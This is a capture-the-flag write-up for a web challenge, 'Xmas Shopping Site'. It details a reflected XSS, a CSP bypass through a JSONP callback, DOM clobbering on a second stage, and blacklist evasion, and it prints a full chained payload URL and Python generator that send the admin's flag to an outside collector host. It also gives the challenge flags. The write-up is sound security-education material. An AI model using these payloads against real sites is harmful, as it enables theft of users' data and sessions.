---
html:
  embed_local_images: true
  embed_svg: true
  offline: true
export_on_save:
  html: true
print_background: true
---
@import "../style.less"

# Xmas Shopping Site - localo


**Category:** Web 
**Difficulty:** Hard        
**Author:** Staubfinger      

## Description
>I made an Xmas Shop! If you run into any problems, just submit a link on the submit page - and i will check it for you.
>
>Check it out at: http://xss.allesctf.net/

## Summery
On `xss.allesctf.net` is website.
With two stages...
Stage1:
@import "stage1.png"
Stage2:
@import "stage2.png"
On the second stage is the flag on the website. To get the real flag we have to find a `XSS` vulnerability and attack the admin. To do this there is a `Submit` page in the first stage.
@import "submit.png"
Here we can submit a URL and the admin will visit it.
## Solution
Let's try to XSS ourself first.
The website has a search filed at the top right, those are often vulnerable to simple XSS attacks:
@import "reflected0.png"
In the `Inspector` we can see that the input is reflected and try to inject simple script:
@import "script.png"
The script element is reflected inside the website, but there is no popup. The console tells us why:
@import "console.png"
### CSP
The `Content Security Policy` is a header that tells the browser which content is allowed. There are many rules and the `CSP evaluator` [link](https://csp-evaluator.withgoogle.com/) can be used to parse them.
Here is the header from the response:
```HTML
Content-Security-Policy: default-src 'self' http://*.xss.allesctf.net; object-src 'none'; base-uri 'none';
```
And the output of the evaluator:
@import "evaluated.png"
Only scripts from `http://*.xss.allesctf.net` and `self` are allowed. 

If we take a look at the network traffic we can see a `GET` request to `http://xss.allesctf.net/items.php?cb=parseItems`
@import "traffic1.png"
As the parameter name already hints `cb` is a callback. And the response is a `js` script:
```js
parseItems([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schÃ¶n."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
```
The format is called `JSONP` it is basically `JSON` wrapped by a callback so that when loaded as a `<script>` it will execute the defined callback. [JSONP on Wikipedia](https://en.wikipedia.org/wiki/JSONP)
If we change the `cb` parameter value we can observer that our input is reflected into the response.
@import "reflect.png"

The `CSP evaluator` mentioned that we should make sure that no `JSONP` is hosted.

We can use the first injection to load a script from `xss.allesctf.net/items.php?cb=...` and set `cb` to some code, here  is the URL for `alert`:
`http://xss.allesctf.net/items.php?cb=alert();//`
this results in the response:
```js
alert();//([{"title": "Weihnachtsbaum", "url": "3.png", "text": "Plastik und voll schÃ¶n."},{"title": "Christbaumkugel", "url": "1.png", "text": "Rund und bunt."},{"title": "Schlitten", "url": "2.png", "text": "Es ist glatt, er ist schnell!"}])
```
The `//` comments out everything after our callback name, therefore we can execute what we want.
Visiting `http://xss.allesctf.net/?search=<script+src='http://xss.allesctf.net/items.php?cb=alert();//'></script>` pops an alert :D
@import "alert.png"

So we can now simply get that flag, right?
The flag is on the page of `stage2`, but we need the right to access it.
@import "token.png"
Otherwise the access is denied..
@import "token2.png"

Fortunately the token is inside the code of `stage1`
@import "token3.png"

Plan:
 1. use the xss on stage1 to get the token
 2. use fetch to get the content of stage2 and grab the flag
 3. submit the flag

The `items.php` has some kind of blacklist some strings are replaced with `FORBIDDEN_CHAR` like: `<` and `>` or `eval`. But most stuff is allowed and the restriction won't cause much problems. There is another restriction a maximum of 250 chars for `cb`. But we can load multiple scripts in the first place and I wrote a simple python script that creates a URL for me.
```python
import requests

s = requests.Session()

def quote(s):
    return s.replace("=","%3d").replace(" ","+").replace("\n",";")

def exec_js(js):
    url = "http://xss.allesctf.net/?search="
    for j in js:
        url+="%%3Cscript%%20src='http://xss.allesctf.net/items.php?cb=%s//'%%3E%%3C/script%%3E" %(quote(j))
    return url

print(exec_js(["alert(1)","alert(2)"]))
```
The output (URL decoded):
```shell
http://xss.allesctf.net/?search=<script src='http://xss.allesctf.net/items.php?cb=alert(1)//'></script><script src='http://xss.allesctf.net/items.php?cb=alert(2)//'></script>
```
And when we visit that we get two alerts.
And here is the fetch:
```python
print(exec_js(["""
x=document.getElementById("stage2").href
function cb1(r){
    console.log(r)
}
n=fetch(x).then(cb1)
"""
]))
```
@import "cors.png"
But it fails because of `CORS`
There is not `Access-Control-Allow-Origin` header. It won't be that easy :(
We could redirect the user to the site, but the we loose control and can't exfiltrate the flag.

After some trial and error I decided to look a bit into stage2. It has a comment:
```
What is CORS? Baby don't hurt me, don't hurt me - no more! 
```
This told me that I was on the right track.
In `stage2` we can change the background:
@import "bg.png"
This is preserved on reloads and therefore saved on the server in the session.
The clients send a `POST` request to the server with the content:
`bg=red`, `bg=green` or `bg=tree` and the server puts the value into a input field in the following responses:
```html
<!-- set bg color -->
<input type="hidden" id="bg" value="tree">
```
This is the parsed by `background.js` which is loaded by the page
```js
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});

$(document).ready(() => {
    $(".bg-btn").click(changeBackground)
});

const changeBackground = (e) => {
    fetch(window.location.href, {
        headers: {'Content-type': 'application/x-www-form-urlencoded'},
        method: "POST",
        credentials: "include",
        body: 'bg=' + $(e.target).val() 
    }).then(() => location.reload())

};
```
The `backgrounds` variable is created inside a `script` element in the page of `stage2`
```html
<script nonce="NcC/JCZ+axyPTQeyv0XZs1YsMEk=">
    var backgrounds = {
        'red': [
            '<img class="bg-img" src="/static/img/red.png"></img>'
         ],
         'green': [
             '<img class="bg-img" src="/static/img/green.png"></img>'
          ],
          'tree': [
              '<img class="bg-img" src="/static/img/tree.png"></img>'
          ]
     }
</script>
```
Let's try to do another injection:
I used the `edit and resend` feature of firefox and changed bg to something that escapes the `value` parameter and removed the `Content-Length` header to force firefox to create a new one.
@import "new.png"
After a reload:
```PHP
<!-- set bg color -->
<input type="hidden" id="bg" value="A"BBBB">
```
The injection worked without a problem.

New Plan:
 1. use the xss on stage1 to get the token
 2. use fetch with `POST` to set the background to inject a script element
 3. exfiltrate the flag

But can we use script tags in `stage2`?!
Here is the CSP:
```HTML
Content-Security-Policy: script-src 'nonce-6BGntpS3POL60qMZ9bj1X47CzA0=' 'unsafe-inline' 'strict-dynamic'; base-uri 'none'; object-src 'none';
```

And the output of `CSP evaluator`:
@import "csp2.png"
It says it is safe.
We can't use the `JSONP` trick, because we need the nonce.


`background.js` writes our content into the page:
```js
$(document).ready(() => {
    $("body").append(backgrounds[$("#bg").val()]);
});
```
The function indexes `backgrounds` with our value and appends the result to the body. We can use `DOM clobbering` to let the script append controlled content. We just have to corrupt the script element that creates the `backgrounds` variable and create a tag with attribute `id=backgrounds`.

here the data of the `POST` request
```html
bg="><a id=backgrounds><!--
```
And after a reload:
```js
> console.log(backgrounds)
a#backgrounds
​
accessKey: ""
​
[...]
​
innerText: "\nCSCG{XSS_THE_ADMIN_FOR_THE_REAL_FLAG:>}"
​
[...]
```
And since we can chose the name of the index we can even reflect the Flag back again.
```js
> console.log(backgrounds["innerText"])


CSCG{XSS_THE_ADMIN_FOR_THE_REAL_FLAG:>}
```

```html
bg=innerText" ><a id=backgrounds><!--
```
@import "reflected2.png"
This does not help us, since we are back at the same problem where we started, how can we exfiltrate it?

This problem took me longer than the rest of the challenge.
It turns out that CSP does not apply to `<script>` tags if they are put into the DOM by a `trusted script`. 
[Source](https://developer.chrome.com/extensions/contentSecurityPolicy#interactions)
And `backgrounds.js` is a trusted script.
Therefore `<script>alert()</script>` just works if `background.js` writes it to the document. We can use the `name` attribute and write our payload into that and use `name` as the index.
```html
bg=name" ><a id=backgrounds name="<script>alert()</script>"><!--
```
And we get our beloved popup:
@import "stage2_xss.png"
Well, we now have to bypass the backlist in `stage1` this can be done by using something like `String.fromCharCode(60)[0]`, chain everything together and add a simple exfiltrate script.
The final script looks like this:
```js
c = String.fromCharCode(60,62,39)
l=`name" ><a id=backgrounds name="<script>$.get('https://[exfiltrate_website]/'.concat($('.col-8 > b')[0].textContent))"></a><!--`
p = {
  headers:{
    "Content-type":"application/x-www-form-urlencoded"
  },
  method:"POST",
  credentials:"include",
  body:`bg=${l}`
}
t = document.getElementById("stage2").href
k=function(){location=t}
fetch(t, p).then(k).catch(k)
```
I reverted the replace of the special chars, but `<` would be replaced by `${c[0]}`, `>` by `${c[1]}` and `'` by `${c[2]}`

We can now generate the full URL:
````
http://xss.allesctf.net/?search=%3Cscript%20src='http://xss.allesctf.net/items.php?cb=var+c%3dString.fromCharCode(60,62,39)//'%3E%3C/script%3E%3Cscript%20src='http://xss.allesctf.net/items.php?cb=;l%3d`name"+${c[1]}${c[0]}a+id%3dbackgrounds+name%3d${c[2]}${c[0]}script${c[1]}$.get("https://enm1wlnbn5g4.x.pipedream.net/".concat($(".col-8+${c[1]}+b")[0].textContent))${c[2]}${c[1]}${c[0]}/a${c[1]}${c[0]}!--`;//'%3E%3C/script%3E%3Cscript%20src='http://xss.allesctf.net/items.php?cb=;p+%3d+{headers:{"Content-type":"application/x-www-form-urlencoded"},method:"POST",credentials:"include",body:`bg%3d${l}`};//'%3E%3C/script%3E%3Cscript%20src='http://xss.allesctf.net/items.php?cb=;t+%3d+document.getElementById("stage2").href;k%3dfunction(){location%3dt};fetch(t,+p).then(k).catch(k);//'%3E%3C/script%3E
````
Submit that and get the flag:
@import "flag.png"

## Code
```python
import requests

s = requests.Session()

def quote(s):
    return s.replace("=","%3d").replace(" ","+").replace("\n",";")

def exec_js(js):
    url = "http://xss.allesctf.net/?search="
    for j in js:
        url+="%%3Cscript%%20src='http://xss.allesctf.net/items.php?cb=%s//'%%3E%%3C/script%%3E" %(quote(j))
    return url

print(exec_js([
"""
var c=String.fromCharCode(60,62,39)""",
"""
l=`name" ${c[1]}${c[0]}a id=backgrounds name=${c[2]}${c[0]}script${c[1]}$.get("https://enm1wlnbn5g4.x.pipedream.net/".concat($(".col-8 ${c[1]} b")[0].textContent))${c[2]}${c[1]}${c[0]}/a${c[1]}${c[0]}!--`
"""%(),
"""
p = {headers:{"Content-type":"application/x-www-form-urlencoded"},method:"POST",credentials:"include",body:`bg=${l}`}
""",
"""
t = document.getElementById("stage2").href
k=function(){location=t}
fetch(t, p).then(k).catch(k)
"""
]))
```
## Mitigation
- do proper input validation
- use nonces and no `JSONP`, do what the `CSP` evaluator says

## Flag
CSCG{c0ngratZ_y0u_l3arnD_sUm_jS:>}